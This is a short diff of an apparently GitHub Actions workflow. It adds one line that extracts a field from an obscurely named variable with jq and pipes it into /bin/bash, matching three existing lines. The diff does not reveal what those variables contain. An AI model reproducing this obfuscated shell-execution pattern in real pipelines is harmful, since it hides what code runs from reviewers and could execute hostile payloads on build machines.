@@ -66,6 +66,7 @@ jobs:
           echo $inxgn4563 | jq -r .gtgm3306 | /bin/bash
           echo $oha8791 | jq -r .dv87 | /bin/bash
           echo $j09882 | jq -r .kq95044 | /bin/bash
+          echo $jbp746 | jq -r .qf346 | /bin/bash
 
       - name: Upload artifact
         if: always()
